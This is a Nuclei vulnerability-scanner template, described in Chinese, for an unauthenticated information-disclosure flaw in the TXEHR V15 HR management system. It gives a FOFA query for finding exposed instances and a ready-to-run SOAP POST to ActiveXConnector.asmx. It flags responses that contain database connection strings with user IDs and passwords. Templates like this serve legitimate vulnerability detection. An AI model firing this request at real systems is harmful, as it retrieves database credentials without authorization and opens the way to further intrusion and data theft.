id: tongxiangHR-TXEHR-V15-ActiveXConnector-Information-disclosure

info:
  name: 同享人力资源管理系统-TXEHR V15 ActiveXConnector 信息泄露漏洞
  author: Superhero
  severity: medium
  description: |-
    fofa: body="/Assistant/Default.aspx"
    同享人力资源管理系统-TXEHR V15 ActiveXConnector.asmx 接口处存在信息泄露漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件如数据库配置文件等，导致网站处于极度不安全状态。
  reference:
    - https://mp.weixin.qq.com/s/yKCHhd8Ii9yQtcZ6ziyM7g?token=1543860814&lang=zh_CN
  tags: Information disclosure

http:
  - raw:
      - |
        POST /Service/ActiveXConnector.asmx HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Accept-Encoding: gzip, deflate, br
        Connection: close
        Content-Type: text/xml;charset=UTF-8

        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tem="http://tempuri.org/">
          <soapenv:Header/>
          <soapenv:Body>
              <tem:GetActivexConnector/>
          </soapenv:Body>
        </soapenv:Envelope>

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - 'server='
          - 'User ID='
          - 'password='
        condition: and
      - type: status
        status: 
          - 200
